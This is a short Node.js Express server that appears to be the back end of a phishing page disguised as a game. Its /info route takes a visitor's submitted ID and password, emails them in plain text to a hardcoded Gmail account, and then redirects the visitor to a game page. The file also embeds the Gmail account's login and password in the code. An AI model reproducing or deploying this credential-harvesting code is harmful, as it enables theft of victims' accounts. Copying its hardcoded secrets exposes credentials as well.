const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');


var urlencodedParser = bodyParser.urlencoded({ extended: false });

port = 3000;
app.listen(port,()=>{
    console.log("The app is up : "+port);
});

app.set('view engine','ejs');
app.set('views','front');
app.use( express.static( "public" ) );
app.get('/', (req, res) => {
    res.render('index', { title: 'Main Page' });
  });

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'peterkarki99@gmail.com',
        pass: 'peterkarki99@GO'
    }
});

app.post('/info',urlencodedParser,(req,res)=>{
    let mailOptions = {
        from: 'peterkarki99@gmail.com', 
        to: 'peterkarki99@gmail.com',
        subject: 'test game',
        text: 'ID :'+req.body.id+' Pass :'+req.body.password,
        
    }
    transporter.sendMail(mailOptions, (err, data) => {
        if (err) {
            return console.log(err);
        }
        return console.log('Email sent!!!');
    });
    res.redirect("/maingame");
    res.end();
});
app.get('/maingame', (req, res) => {
    res.render('game', { title: 'game' });
  });